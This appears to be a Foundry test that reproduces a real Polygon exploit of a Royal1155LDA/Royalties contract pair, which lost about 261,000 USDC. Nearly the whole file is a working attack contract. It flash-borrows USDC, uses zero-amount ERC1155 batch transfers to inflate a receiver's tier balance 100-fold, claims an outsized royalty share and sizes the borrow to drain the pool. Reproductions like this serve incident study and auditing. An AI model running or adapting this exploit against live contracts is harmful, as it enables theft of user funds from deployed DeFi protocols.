// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 261,162.93 USDC
// Attacker : 0xbd829aa63311bb1e3c0ea58a7193364de670bd56
// Attack Contract : 0x11ca9155aedfeb6772df5ea42ff714db7fba6adb
// Vulnerable Contract : 0xd5b297c08d890376b6cbdba6023a39ffbdf65c78
// Attack Tx : https://polygonscan.com/tx/0x7a92106f145045b7a2bdce60a22109739f9b0cd0185bf16ff83fd1fac98cb42e

// @Info
// Vulnerable Contract Code : https://polygonscan.com/address/0xd5b297c08d890376b6cbdba6023a39ffbdf65c78#code
// Royalty Contract Code : https://polygonscan.com/address/0x1e0598614d9168a657cb57bd038dfd71812c9074#code

// @Analysis
// Twitter Guy : https://x.com/TenArmorAlert/status/2069596801725002121
//
// Root Cause : Royal1155LDA updates custom per-tier balance bookkeeping for every ERC1155 batch
// item even when `amounts[i] == 0`. With owned-token backfill incomplete, a zero-balance sender can
// batch-transfer 100 zero-amount tier-42 LDAs to a fresh receiver. The Royalties contract then reads
// the receiver's inflated `tierBalanceOf` as 100 while tier supply is 1, so one deposit is claimed
// at 100x pro-rata ownership.

address constant USDC_TOKEN = 0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174;
address constant QUICKSWAP_WMATIC_USDC_PAIR = 0x6e7a5FAFcec6BB1e78bAE2A1F0B612012BF14827;
address constant ROYAL_LDA_PROXY = 0x7c885c4bFd179fb59f1056FBea319D579A278075;
address constant ROYALTIES_PROXY = 0xfE16Ee78828672e86cf8E42d8A5119AB79877EC7;

uint128 constant TIER_ID = 42;
uint256 constant ZERO_AMOUNT_TRANSFERS = 100;
uint256 constant TRACE_LDA_TOKEN_NUMBER = 424_242;

interface IRoyal1155LDA {
    function safeBatchTransferFrom(
        address from,
        address to,
        uint256[] calldata ids,
        uint256[] calldata amounts,
        bytes calldata data
    ) external;

    function tierBalanceOf(
        uint128 tierId,
        address owner
    ) external view returns (uint256);
    function getTierTotalSupply(
        uint128 tierId
    ) external view returns (uint256);
    function getIsOwnedTokensBackfillComplete() external view returns (bool);
}

interface IRoyalties {
    function deposit(
        address depositor,
        uint128 tierId,
        uint256 amount
    ) external;
    function claim(
        address claimer,
        uint128[] calldata tierIds,
        address recipient
    ) external returns (uint256[] memory);
}

contract ContractTest is BaseTestWithBalanceLog {
    RoyalRoyaltiesAttacker private attackContract;

    function setUp() public {
        uint256 forkBlock = 89_018_050;
        vm.createSelectFork("polygon", forkBlock);

        attackContract = new RoyalRoyaltiesAttacker();

        fundingToken = USDC_TOKEN;
        attacker = address(attackContract);

        vm.label(USDC_TOKEN, "USDC");
        vm.label(QUICKSWAP_WMATIC_USDC_PAIR, "QuickSwap WMATIC/USDC Pair");
        vm.label(ROYAL_LDA_PROXY, "Royal1155LDA Proxy");
        vm.label(ROYALTIES_PROXY, "Royalties Proxy");
        vm.label(address(attackContract), "Local attacker helper");
    }

    function testExploit() public balanceLog {
        assertEq(IRoyal1155LDA(ROYAL_LDA_PROXY).getTierTotalSupply(TIER_ID), 1);
        assertFalse(IRoyal1155LDA(ROYAL_LDA_PROXY).getIsOwnedTokensBackfillComplete());

        uint256 beforeBalance = IERC20(USDC_TOKEN).balanceOf(address(attackContract));
        uint256 profit = attackContract.execute();
        uint256 afterBalance = IERC20(USDC_TOKEN).balanceOf(address(attackContract));

        assertEq(afterBalance - beforeBalance, profit);
        assertGt(profit, 260_000e6);
    }
}

contract RoyalRoyaltiesAttacker {
    RoyalClaimReceiver private claimReceiver;

    function execute() external returns (uint256 profit) {
        uint256 balanceBefore = IERC20(USDC_TOKEN).balanceOf(address(this));
        uint256 borrowAmount = _deriveBorrowAmount();

        IUniswapV2Pair(QUICKSWAP_WMATIC_USDC_PAIR).swap(0, borrowAmount, address(this), abi.encode(borrowAmount));

        profit = IERC20(USDC_TOKEN).balanceOf(address(this)) - balanceBefore;
    }

    function uniswapV2Call(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external {
        require(msg.sender == QUICKSWAP_WMATIC_USDC_PAIR, "unexpected pair");
        require(sender == address(this), "unexpected sender");
        require(amount0 == 0, "unexpected token0 borrow");

        uint256 borrowAmount = abi.decode(data, (uint256));
        require(amount1 == borrowAmount, "unexpected USDC borrow");

        // step 1: zero-amount batch items still call the royalty hook and increment LDA tier balance.
        claimReceiver = new RoyalClaimReceiver();
        _inflateReceiverTierBalance(address(claimReceiver));
        assert(IRoyal1155LDA(ROYAL_LDA_PROXY).tierBalanceOf(TIER_ID, address(claimReceiver)) == ZERO_AMOUNT_TRANSFERS);

        // step 2: make the trace-sized royalty deposit from the flash-borrowed USDC.
        IERC20(USDC_TOKEN).approve(ROYALTIES_PROXY, borrowAmount);
        IRoyalties(ROYALTIES_PROXY).deposit(address(this), TIER_ID, borrowAmount);

        // step 3: claim through the receiver, whose apparent tier ownership is now 100 / supply(1).
        uint256 claimed = claimReceiver.claim(ROYALTIES_PROXY, TIER_ID, address(this));
        assert(claimed == borrowAmount * ZERO_AMOUNT_TRANSFERS);

        // step 4: repay the QuickSwap V2 flash swap fee observed in the trace.
        uint256 repayAmount = (borrowAmount * 1000) / 997 + 1;
        IERC20(USDC_TOKEN).transfer(QUICKSWAP_WMATIC_USDC_PAIR, repayAmount);
    }

    function _inflateReceiverTierBalance(
        address receiver
    ) private {
        uint256[] memory ids = new uint256[](ZERO_AMOUNT_TRANSFERS);
        uint256[] memory amounts = new uint256[](ZERO_AMOUNT_TRANSFERS);
        uint256 ldaId = _composeLdaId(TIER_ID, TRACE_LDA_TOKEN_NUMBER);

        for (uint256 i; i < ZERO_AMOUNT_TRANSFERS; ++i) {
            ids[i] = ldaId;
            amounts[i] = 0;
        }

        IRoyal1155LDA(ROYAL_LDA_PROXY).safeBatchTransferFrom(address(this), receiver, ids, amounts, "");
    }

    function _deriveBorrowAmount() private view returns (uint256) {
        uint256 royaltyFloat = IERC20(USDC_TOKEN).balanceOf(ROYALTIES_PROXY);

        // The claim is borrowAmount * 100 while the contract balance after deposit is royaltyFloat + borrowAmount.
        // Dividing by 99 gives the maximum borrow that leaves the 100x claim funded by pre-existing royalties.
        return royaltyFloat / (ZERO_AMOUNT_TRANSFERS - 1);
    }

    function _composeLdaId(
        uint128 tierId,
        uint256 tokenNumber
    ) private pure returns (uint256) {
        return (uint256(tierId) << 128) | tokenNumber;
    }
}

contract RoyalClaimReceiver {
    function claim(
        address royalties,
        uint128 tierId,
        address recipient
    ) external returns (uint256) {
        uint128[] memory tierIds = new uint128[](1);
        tierIds[0] = tierId;

        uint256[] memory claimed = IRoyalties(royalties).claim(address(this), tierIds, recipient);
        return claimed[0];
    }

    function onERC1155BatchReceived(
        address,
        address,
        uint256[] calldata,
        uint256[] calldata,
        bytes calldata
    ) external pure returns (bytes4) {
        return this.onERC1155BatchReceived.selector;
    }
}
